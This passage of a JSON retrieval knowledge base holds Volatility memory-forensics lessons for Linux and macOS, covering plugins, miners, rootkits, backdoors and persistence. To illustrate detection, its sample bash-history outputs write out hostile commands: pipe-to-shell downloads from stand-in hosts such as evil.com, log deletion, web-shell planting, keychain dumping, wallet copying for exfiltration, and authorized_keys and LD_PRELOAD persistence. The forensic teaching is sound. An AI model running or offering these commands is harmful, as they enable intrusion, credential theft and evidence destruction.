+    "content": "### Category 1: Plugins That Work WITHOUT Symbols\n\nThese plugins work on ANY Linux dump by pattern scanning:\n\n#### linux.bash.Bash\n**Purpose**: Extract bash command history from memory\n\n**Command:**\n```bash\nvol -f memory.lime linux.bash.Bash\n```\n\n**What it finds:**\n- Commands typed in bash shells\n- Commands from all users (root, regular users)\n- Commands from closed terminals (still in memory)\n- Commands from SSH sessions",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Volatility Plugins",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_109",
+    "content": "**Example Output:**\n```\nPID     Process         CommandTime     Command\n1234    bash           2024-01-18 14:30:00    wget http://evil.com/malware.sh\n1234    bash           2024-01-18 14:30:15    chmod +x malware.sh\n1234    bash           2024-01-18 14:30:20    ./malware.sh\n5678    bash           2024-01-18 15:00:00    curl -s http://c2.evil.com | bash\n5678    bash           2024-01-18 15:01:00    rm -rf /var/log/*\n```\n\n**Red Flags:**\n- wget/curl downloading from suspicious domains\n- chmod +x on files in /tmp or /dev/shm\n- rm -rf on log files (anti-forensics)\n- Base64 encoded commands (obfuscation)\n- History manipulation: `history -c`, `unset HISTFILE`\n\n#### linux.psaux.PsAux\n**Purpose**: List all running processes (symbol-free)\n\n**Command:**\n```bash\nvol -f memory.lime linux.psaux.PsAux\n```",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Volatility Plugins",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_110",
+    "content": "**Output Columns:**\n- PID, UID, GID - Process and user identifiers\n- Arguments - Full command line\n\n**Example:**\n```\nPID     UID     GID     Arguments\n1       0       0       /sbin/init\n1234    1000    1000    /tmp/xmrig --url pool.minexmr.com:4444\n5678    0       0       python3 /tmp/.hidden/backdoor.py\n```\n\n**Red Flags:**\n- Processes in /tmp or /dev/shm (temporary locations)\n- Hidden directories (names starting with .)\n- Cryptocurrency miners (xmrig, cpuminer, minerd)\n- Processes with no parent (PPID 1 but not system service)\n\n#### banners.Banners\n**Purpose**: Identify kernel version, distribution, system info\n\n**Command:**\n```bash\nvol -f memory.lime banners.Banners\n```",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Volatility Plugins",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_111",
+    "content": "**Output:**\n```\nOffset          Banner\n0x12345678      Linux version 5.4.0-42-generic (Ubuntu 20.04.1 LTS)\n0x23456789      Ubuntu 20.04.1 LTS \\n \\l\n0x34567890      Intel(R) Xeon(R) CPU E5-2670 v3 @ 2.30GHz\n```\n\n**Use Cases:**\n1. Identify exact kernel version for symbol download\n2. Determine Linux distribution (Ubuntu, CentOS, Debian)\n3. Verify system specs match incident report\n\n### Category 2: Plugins That NEED Symbols\n\nThese plugins require Linux kernel symbol files:\n\n#### linux.pslist.PsList\n**Purpose**: Fast process listing using kernel structures\n\n**Command:**\n```bash\nvol -f memory.lime linux.pslist.PsList\n```",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Volatility Plugins",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_112",
+    "content": "**Advantages over psaux:**\n- 10x faster (uses kernel task_struct linked list)\n- Shows hidden processes (rootkit detection)\n- Shows parent-child relationships (PPID)\n- Shows process state (running, sleeping, zombie)\n\n**Example Output:**\n```\nPID     PPID    COMM            State\n1       0       systemd         RUNNING\n1234    1       apache2         SLEEPING\n5678    1       [kworker]       RUNNING (SUSPICIOUS - fake kernel thread)\n```\n\n#### linux.pstree.PsTree\n**Purpose**: Show process hierarchy\n\n**Command:**\n```bash\nvol -f memory.lime linux.pstree.PsTree\n```\n\n**Use Cases:**\n- Identify parent-child relationships\n- Find orphaned processes (malware)\n- Trace process spawn chains (lateral movement)",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Volatility Plugins",
+      "chunk_index": 4,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_113",
+    "content": "**Example:**\n```\nsystemd (1)\n├── sshd (1000)\n│   └── bash (1234)\n│       └── wget (1235) - Downloads malware\n│           └── malware.sh (1236) - Executes malware\n└── cryptominer (5678) - Orphaned (should not be child of systemd)\n```\n\n#### linux.lsof.Lsof\n**Purpose**: List open files and network connections\n\n**Command:**\n```bash\nvol -f memory.lime linux.lsof.Lsof\n```\n\n**What it shows:**\n- Open files (log files, executables, data files)\n- Network connections (TCP/UDP sockets)\n- Pipes and IPC mechanisms\n- Deleted files still in memory (malware hides by deleting after execution)",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Volatility Plugins",
+      "chunk_index": 5,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_114",
+    "content": "**Red Flags:**\n```\nPID     FD      Type    Details\n1234    3       REG     /tmp/malware (deleted) - Malware deleted itself but still running\n5678    4       SOCK    192.168.1.100:443 -> 93.184.216.34:4444 - C2 connection\n```\n\n#### linux.malfind.Malfind\n**Purpose**: Find code injection and shellcode\n\n**Command:**\n```bash\nvol -f memory.lime linux.malfind.Malfind\n```\n\n**Detects:**\n- Injected shared libraries (.so files)\n- Anonymous memory regions (mmap without file backing)\n- Executable stack (common in exploits)",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Volatility Plugins",
+      "chunk_index": 6,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_115",
+    "content": "### Threat 1: Cryptocurrency Miners\n\n**Common Miners:**\n- XMRig (Monero mining)\n- cpuminer / minerd (CPU mining)\n- xmr-stak (Monero Stakd)\n\n**Detection in Memory:**\n```bash\n# Find miner processes\nvol -f memory.lime linux.psaux.PsAux | grep -i \"xmrig\\|miner\\|cpuminer\"\n\n# Find bash commands downloading miners\nvol -f memory.lime linux.bash.Bash | grep -i \"xmrig\\|mining\\|pool\"\n\n# Example output:\n# bash: wget hxxp://pool.minexmr.com/xmrig\n# bash: ./xmrig --url pool.minexmr.com:4444 --user 47ABC...\n```\n\n**IOCs:**\n- Process names: xmrig, minerd, cpuminer\n- Command-line args: --url pool.minexmr.com, --donate-level\n- Network connections to mining pools (port 3333, 4444, 5555)\n- High CPU usage (99% sustained)\n\n### Threat 2: SSH Backdoors",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux-Specific Malware Detection",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_116",
+    "content": "**Types:**\n1. **Authorized Keys Backdoor**: Attacker adds public key to ~/.ssh/authorized_keys\n2. **PAM Backdoor**: Modified /etc/pam.d files (universal password)\n3. **SSH Daemon Backdoor**: Modified sshd binary (hardcoded password)\n\n**Detection:**\n```bash\n# Find SSH sessions in memory\nvol -f memory.lime linux.bash.Bash | grep ssh\n\n# Look for suspicious SSH commands\n# Example output:\n# bash: echo \"ssh-rsa AAAAB3NzaC1yc2E...\" >> ~/.ssh/authorized_keys\n# bash: chmod 600 ~/.ssh/authorized_keys\n```\n\n**Red Flags:**\n- SSH sessions from unusual IPs (foreign countries)\n- SSH logins to root account (should use sudo)\n- Multiple failed SSH attempts followed by success (brute force)\n\n### Threat 3: Rootkits",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux-Specific Malware Detection",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_117",
+    "content": "**What is a Linux rootkit?**\n- Kernel module (.ko) that hides processes, files, network connections\n- Modifies kernel functions (hooking)\n- Survives reboots if installed in /etc/modules or initramfs\n\n**Detection:**\n```bash\n# List loaded kernel modules\nvol -f memory.lime linux.lsmod.Lsmod\n\n# Check for hidden modules (loaded but not in lsmod output)\nvol -f memory.lime linux.check_modules.Check_modules\n\n# Find hooked system calls\nvol -f memory.lime linux.check_syscall.Check_syscall\n```\n\n**Known Rootkit Families:**\n- Diamorphine (process hiding, privilege escalation)\n- Suterusu (network hiding, file hiding)\n- Reptile (full-featured rootkit with C2)\n- Vlany (userland rootkit with LD_PRELOAD)",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux-Specific Malware Detection",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_118",
+    "content": "**IOCs:**\n- Kernel modules in /tmp or /dev/shm (not typical module locations)\n- Modules with random names (abc123.ko)\n- Modified system call table entries\n\n### Threat 4: Container Escapes\n\n**What is container escape?**\n- Breaking out of Docker/LXC container to host system\n- Exploiting kernel vulnerabilities (Dirty COW, CVE-2019-5736)\n- Mounting host filesystem inside container\n\n**Detection:**\n```bash\n# Find container processes\nvol -f memory.lime linux.psaux.PsAux | grep -i \"docker\\|containerd\\|runc\"\n\n# Check for suspicious mounts\nvol -f memory.lime linux.mount.Mount\n\n# Look for privilege escalation\nvol -f memory.lime linux.bash.Bash | grep -i \"docker\\|nsenter\\|unshare\"\n```",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux-Specific Malware Detection",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_119",
+    "content": "**Red Flags:**\n- Container processes accessing host filesystem (/host/root)\n- nsenter or unshare commands (namespace manipulation)\n- Privileged containers (--privileged flag)",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux-Specific Malware Detection",
+      "chunk_index": 4,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_120",
+    "content": "### Metasploit on Linux\n\n**Meterpreter Indicators:**\n```bash\n# Process: Often injected into legitimate process\n# Network: Connection to attacker IP on port 4444 (default)\n# Files: /tmp/.X11-unix/.X0-lock (hidden socket)\n```\n\n**Detection:**\n```bash\nvol -f memory.lime linux.bash.Bash | grep -i \"meterpreter\\|msf\\|payload\"\nvol -f memory.lime linux.lsof.Lsof | grep \"4444\"\n```\n\n### Empire/Starkiller (PowerShell Empire)\n\n**Linux Agent Indicators:**\n```bash\n# Process: python3 with obfuscated script\n# Network: HTTPS to C2 (port 443)\n# Persistence: Cron jobs or systemd services\n```\n\n### Sliver C2\n\n**Modern C2 framework (Go-based):**\n```bash\n# Process: Hidden in /tmp or /var/tmp\n# Network: mTLS encrypted C2 (hard to detect without process analysis)\n# Beaconing: Regular check-ins every X seconds\n```",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux C2 Frameworks",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_121",
+    "content": "**Detection:**\n```bash\n# Find Go-compiled binaries (Sliver is written in Go)\nvol -f memory.lime linux.bash.Bash | grep -i \"sliver\\|beacon\"\n\n# Look for network beaconing\nvol -f memory.lime linux.lsof.Lsof | grep \"ESTABLISHED\"\n```",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux C2 Frameworks",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_122",
+    "content": "### 1. Cron Jobs\n**Purpose**: Schedule malware to run periodically\n\n**Detection:**\n```bash\n# Cron files stored in memory\nvol -f memory.lime linux.bash.Bash | grep crontab\n\n# Example:\n# bash: (crontab -l; echo \"*/5 * * * * /tmp/miner\") | crontab -\n```\n\n**Locations:**\n- /etc/crontab (system-wide)\n- /etc/cron.d/ (per-app cron)\n- /var/spool/cron/crontabs/[user] (user crontabs)\n\n### 2. Systemd Services\n**Purpose**: Run malware as system service\n\n**Detection:**\n```bash\nvol -f memory.lime linux.bash.Bash | grep systemctl\n\n# Example:\n# bash: systemctl enable malware.service\n# bash: systemctl start malware.service\n```\n\n**Service file location:**\n- /etc/systemd/system/ (user-created services)\n- /lib/systemd/system/ (system services)\n\n### 3. SSH Keys\n**Purpose**: Persistent backdoor access",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Persistence Mechanisms",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_123",
+    "content": "**Detection:**\n```bash\nvol -f memory.lime linux.bash.Bash | grep authorized_keys\n\n# Example:\n# bash: echo \"ssh-rsa AAAAB3NzaC...\" >> /root/.ssh/authorized_keys\n```\n\n### 4. LD_PRELOAD Rootkits\n**Purpose**: Inject malicious library into all processes\n\n**Detection:**\n```bash\nvol -f memory.lime linux.bash.Bash | grep LD_PRELOAD\n\n# Example:\n# bash: export LD_PRELOAD=/tmp/evil.so\n# bash: echo 'export LD_PRELOAD=/tmp/evil.so' >> /etc/profile\n```",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Persistence Mechanisms",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_124",
+    "content": "### Scenario 1: Compromised Web Server\n\n**Initial Triage:**\n```bash\n# 1. Get system info\nvol -f webserver.lime banners.Banners\n\n# 2. Find bash history\nvol -f webserver.lime linux.bash.Bash > bash_history.txt\n\n# 3. Look for web shell uploads\ngrep -i \"wget\\|curl\\|upload\" bash_history.txt\n\n# 4. Find suspicious processes\nvol -f webserver.lime linux.psaux.PsAux > processes.txt\ngrep -i \"tmp\\|dev/shm\\|hidden\" processes.txt\n```\n\n**Analysis:**\n```bash\n# Example findings:\n# bash: wget http://attacker.com/webshell.php\n# bash: mv webshell.php /var/www/html/uploads/\n# bash: chmod 644 /var/www/html/uploads/webshell.php\n\n# Next steps:\n# - Identify web shell location\n# - Check network connections from web server process\n# - Review Apache/Nginx access logs\n```",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Practical Linux Forensics Workflow",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_125",
+    "content": "### Scenario 2: Cryptocurrency Miner Investigation\n\n**Detection:**\n```bash\n# 1. Find high-CPU processes\nvol -f server.lime linux.psaux.PsAux | grep -v \"0.0\"\n\n# 2. Search for miner commands\nvol -f server.lime linux.bash.Bash | grep -i \"xmrig\\|miner\\|pool\"\n\n# Example output:\n# bash: curl -s -L https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz | tar xz\n# bash: ./xmrig --url pool.supportxmr.com:443 --user 47ABC...\n```\n\n**Remediation:**\n```bash\n# 1. Identify miner process PID\n# 2. Kill process: kill -9 <PID>\n# 3. Find persistence (cron, systemd)\n# 4. Remove miner files\n# 5. Block mining pool domains at firewall\n```\n\n### Scenario 3: SSH Brute Force + Backdoor\n\n**Analysis:**\n```bash\n# 1. Find SSH activity\nvol -f server.lime linux.bash.Bash | grep ssh",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Practical Linux Forensics Workflow",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_126",
+    "content": "# 2. Check for authorized_keys modifications\n# bash: echo \"ssh-rsa AAAAB3...\" >> /root/.ssh/authorized_keys\n\n# 3. Find SSH connections\nvol -f server.lime linux.lsof.Lsof | grep \":22\"\n\n# Example:\n# sshd: 192.168.1.100:22 -> 93.184.216.34:55123 ESTABLISHED\n```\n\n**IOCs:**\n- Multiple SSH connections from same external IP\n- Authorized keys added from bash commands\n- SSH sessions running commands (wget, curl)",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Practical Linux Forensics Workflow",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_127",
+    "content": "1. **Use symbol-free plugins first**: linux.bash.Bash and linux.psaux.PsAux work without symbols\n2. **Focus on bash history**: Reveals attacker commands and TTPs\n3. **Check /tmp and /dev/shm**: Common malware hiding spots\n4. **Cryptocurrency miners are common**: XMRig is most popular\n5. **Rootkits hide in kernel modules**: Check loaded modules and syscall hooks\n6. **Containers add complexity**: Docker escapes are a real threat\n\n**Golden Rule**: ANY process in /tmp or /dev/shm is suspicious until proven otherwise.",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Key Takeaways",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_128",
+    "content": "- **Module 07**: Mac memory forensics\n- **Module 08**: Advanced kernel analysis\n- **Module 09**: Timeline generation and correlation\n\n---\n\n**References**:\n- \"The Art of Memory Forensics\" (Linux section) by Michael Hale Ligh et al.\n- Volatility 3 Documentation: https://volatility3.readthedocs.io/\n- LiME GitHub: https://github.com/504ensicsLabs/LiME",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "What's Next?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_129",
+    "content": "**Growing macOS threat landscape:**\n- **Corporate environments**: 23% of enterprise endpoints run macOS (Jamf 2024)\n- **High-value targets**: Developers, executives, creative professionals\n- **False sense of security**: \"Macs don't get viruses\" (outdated myth)\n- **Sophisticated threats**: State-sponsored APTs targeting macOS (Lazarus Group, APT32)\n\n**macOS-specific malware families:**\n- XCSSET (Xcode project infection)\n- Silver Sparrow (M1-native malware)\n- Shlayer (adware installer)\n- OSX.Pirrit (adware)\n- RustBucket (North Korean APT)\n- MacStealer (infostealer targeting cryptocurrency wallets)",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "Why macOS Memory Forensics?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_130",
+    "content": "### osxpmem (Rekall Memory Forensics)\n\n**What is osxpmem?**\n- Kernel extension (kext) for macOS memory acquisition\n- Works on macOS 10.10+ (including Big Sur, Monterey, Ventura)\n- Requires SIP (System Integrity Protection) to be disabled on modern macOS\n\n**Installation:**\n```bash\n# Download osxpmem\ncurl -L https://github.com/google/rekall/releases/download/v1.5.1/osxpmem-2.1.post4.zip -o osxpmem.zip\nunzip osxpmem.zip\n\n# macOS 10.13+ requires SIP disabled\n# CAUTION: Disabling SIP reduces system security\n# Reboot to Recovery Mode (Cmd+R), then:\ncsrutil disable\nreboot\n```\n\n**Basic Acquisition:**\n```bash\n# Acquire memory to file\nsudo osxpmem.app/osxpmem -o memory.aff4\n\n# Alternative: Raw format\nsudo osxpmem.app/osxpmem --format raw -o memory.raw",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Memory Acquisition",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_131",
+    "content": "# Verify acquisition\nls -lh memory.aff4\n# Expected: 8GB+ file (depends on RAM size)\n```\n\n**Modern macOS Challenges:**\n- **SIP (System Integrity Protection)**: Blocks kernel extensions\n- **Apple Silicon (M1/M2)**: Limited tooling support\n- **T2 Security Chip**: Hardware-level encryption\n\n### Alternative: MacMemoryReader\n\n**Lightweight acquisition tool:**\n```bash\n# Download from GitHub\ngit clone https://github.com/jipegit/OSXAuditor\ncd OSXAuditor\n\n# Run as root\nsudo ./MacMemoryReader\n\n# Output: memory.dump (raw format)\n```\n\n**Advantages:**\n- No kernel extension required (uses vm_read API)\n- Works with SIP enabled (limited access)\n- Compatible with Apple Silicon (M1/M2)\n\n**Limitations:**\n- Cannot access kernel memory (user-space only)\n- May miss kernel rootkits",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Memory Acquisition",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_132",
+    "content": "### Category 1: Process Analysis\n\n#### mac.pslist.PsList\n**Purpose**: List all running processes\n\n**Command:**\n```bash\nvol -f memory.aff4 mac.pslist.PsList\n```\n\n**Output Columns:**\n- PID - Process ID\n- PPID - Parent process ID\n- Name - Process name\n- Path - Full executable path\n- Start Time - When process started\n\n**Example Output:**\n```\nPID     PPID    Name                    Path\n1       0       launchd                 /sbin/launchd\n200     1       UserEventAgent          /usr/libexec/UserEventAgent\n1234    1       suspicious.app          /tmp/.hidden/suspicious.app\n5678    1       Finder                  /System/Library/CoreServices/Finder.app\n```",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Volatility Plugins",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_133",
+    "content": "**Red Flags:**\n- Processes in /tmp or /private/tmp (temporary locations)\n- Processes in hidden directories (.hidden, .config)\n- Misspelled system processes (Findre instead of Finder)\n- Processes with unusual paths (/Users/Shared, /Library/LaunchDaemons)\n\n#### mac.pstree.PsTree\n**Purpose**: Show process hierarchy\n\n**Command:**\n```bash\nvol -f memory.aff4 mac.pstree.PsTree\n```\n\n**Example:**\n```\nlaunchd (1)\n├── UserEventAgent (200)\n├── loginwindow (300)\n│   └── Finder (5678)\n│       └── Terminal (6789)\n│           └── bash (7890)\n│               └── malware.sh (8901) - Suspicious script\n└── suspicious.app (1234) - Orphaned (should not be child of launchd)\n```\n\n### Category 2: Network Analysis\n\n#### mac.netstat.Netstat\n**Purpose**: Show network connections",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Volatility Plugins",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_134",
+    "content": "**Command:**\n```bash\nvol -f memory.aff4 mac.netstat.Netstat\n```\n\n**Output:**\n```\nProto   Local Address           Foreign Address         State           PID/Program\nTCP     192.168.1.100:49152     93.184.216.34:443       ESTABLISHED     1234/suspicious.app\nTCP     127.0.0.1:5000          127.0.0.1:49200         ESTABLISHED     5678/Python\nUDP     0.0.0.0:5353            0.0.0.0:0               LISTENING       200/mDNSResponder\n```\n\n**Red Flags:**\n- Connections to unusual IPs (non-Apple, non-Google)\n- High-numbered ports (4444, 31337, 12345)\n- Processes with unexpected network activity (TextEdit with network connection)\n- Connections to known C2 domains\n\n### Category 3: File System Analysis\n\n#### mac.lsof.Lsof\n**Purpose**: List open files and network sockets",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Volatility Plugins",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_135",
+    "content": "**Command:**\n```bash\nvol -f memory.aff4 mac.lsof.Lsof\n```\n\n**What it shows:**\n- Open files (documents, executables, libraries)\n- Network connections (TCP/UDP sockets)\n- Pipes and IPC mechanisms\n- Deleted files still in memory\n\n**Example:**\n```\nPID     FD      Type    Details\n1234    3       REG     /tmp/malware (deleted) - Malware deleted itself\n1234    4       SOCK    192.168.1.100:443 -> 93.184.216.34:4444\n5678    5       REG     /Users/victim/Library/LaunchAgents/com.malware.plist\n```\n\n### Category 4: Bash History\n\n#### mac.bash.Bash\n**Purpose**: Extract bash command history from memory\n\n**Command:**\n```bash\nvol -f memory.aff4 mac.bash.Bash\n```",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Volatility Plugins",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_136",
+    "content": "**Example Output:**\n```\nPID     Process         CommandTime             Command\n7890    bash           2024-01-18 14:30:00      curl -s http://evil.com/payload.sh | bash\n7890    bash           2024-01-18 14:31:00      chmod +x /tmp/miner\n7890    bash           2024-01-18 14:32:00      /tmp/miner --url pool.minexmr.com:4444\n```\n\n**Red Flags:**\n- curl/wget downloading scripts and piping to bash\n- chmod +x on files in /tmp\n- Python -c with base64 encoded commands (obfuscation)\n- History manipulation: history -c, rm ~/.bash_history",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS Volatility Plugins",
+      "chunk_index": 4,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_137",
+    "content": "### Threat 1: Adware (Most Common)\n\n**Common Families:**\n- **Shlayer**: Fake Flash Player updates\n- **OSX.Pirrit**: Injected ads and browser hijacking\n- **Bundlore**: Bundled with pirated software\n\n**Detection:**\n```bash\n# Find adware processes\nvol -f memory.aff4 mac.pslist.PsList | grep -i \"adware\\|shlayer\\|pirrit\"\n\n# Check for browser extensions\nvol -f memory.aff4 mac.bash.Bash | grep -i \"safari\\|chrome\\|extension\"\n\n# Example:\n# bash: defaults write ~/Library/Preferences/com.apple.Safari.plist\n# bash: cp malicious_extension.safariextz ~/Library/Safari/Extensions/\n```\n\n**IOCs:**\n- Processes in /Library/Application Support/\n- LaunchAgents with random names (com.xyz.agent.plist)\n- Browser processes with unusual command-line arguments\n\n### Threat 2: Cryptocurrency Miners",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS-Specific Malware Detection",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_138",
+    "content": "**Detection:**\n```bash\n# Find miner processes\nvol -f memory.aff4 mac.pslist.PsList | grep -i \"xmrig\\|miner\\|cpuminer\"\n\n# Check bash history\nvol -f memory.aff4 mac.bash.Bash | grep -i \"mining\\|pool\\|monero\"\n\n# Example:\n# bash: curl -s https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-macos-x64.tar.gz | tar xz\n# bash: ./xmrig --url pool.supportxmr.com:443\n```\n\n**IOCs:**\n- High CPU usage (99% sustained)\n- Connections to mining pools (ports 3333, 4444, 5555)\n- Processes with mining-related names\n\n### Threat 3: Infostealers\n\n**MacStealer (2023 threat):**\n```bash\n# Targets:\n# - Password keychains (Keychain.app)\n# - Cryptocurrency wallets (Electrum, Exodus, Coinomi)\n# - Browser cookies and credentials\n# - iCloud tokens",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS-Specific Malware Detection",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_139",
+    "content": "# Detection:\nvol -f memory.aff4 mac.bash.Bash | grep -i \"keychain\\|wallet\\|cookie\"\n\n# Example:\n# bash: security dump-keychain ~/Library/Keychains/login.keychain-db\n# bash: cp -r ~/Library/Application\\ Support/Coinomi /tmp/exfil/\n```\n\n### Threat 4: Backdoors and RATs\n\n**OSX.Bella (Lazarus Group):**\n```bash\n# Backdoor capabilities:\n# - Remote shell access\n# - File upload/download\n# - Screenshot capture\n# - Keylogging\n\n# Detection:\nvol -f memory.aff4 mac.netstat.Netstat | grep ESTABLISHED\n\n# Example:\n# TCP 192.168.1.100:49152 -> 93.184.216.34:443 ESTABLISHED (com.apple.update)\n```\n\n**Red Flags:**\n- Process names impersonating Apple services (com.apple.update, AppleUpdate)\n- Outbound HTTPS connections from non-browser processes\n- LaunchDaemons with Apple-like names (com.apple.systemd.plist)",
+    "metadata": {
+      "filename": "07_mac_forensics.md",
+      "document_title": "macOS Memory Forensics with Volatility",
+      "section": "macOS-Specific Malware Detection",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "07_mac_forensics.md_140",
